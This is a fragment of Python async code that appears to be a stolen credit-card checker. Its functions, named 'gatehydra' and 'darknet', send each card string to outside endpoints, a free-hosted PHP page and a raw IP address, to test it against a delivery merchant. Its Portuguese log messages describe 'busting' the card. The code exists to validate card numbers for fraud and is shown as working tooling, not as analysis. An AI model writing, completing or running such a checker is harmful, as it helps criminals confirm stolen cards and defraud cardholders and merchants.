...
async def gatehydra(card: str) -> Tuple[Optional[bool], str]:
    gate = "hydra"
    print(f"[GATE_{gate}][{card}] Estrupando a cc na AmoDelivery...")
    token = "hydra"
    try:
        rt = await hc.get(
            f"https://chkfalsevigaga.000webhostapp.com/false.php?lista=",
...
async def darknet(card: str, gate: str = "erede") -> Tuple[Optional[bool], str]:
    ...
    print(f"[GATE_{current_gate}][{card}] Checkando na AmoDelivery...")

    try:
        rt = await hc.get(
            f"http://20.226.7.198/chk/amo.php",
            params=dict(key=token, lista=card),
        )
        rtext: dict = rt.text
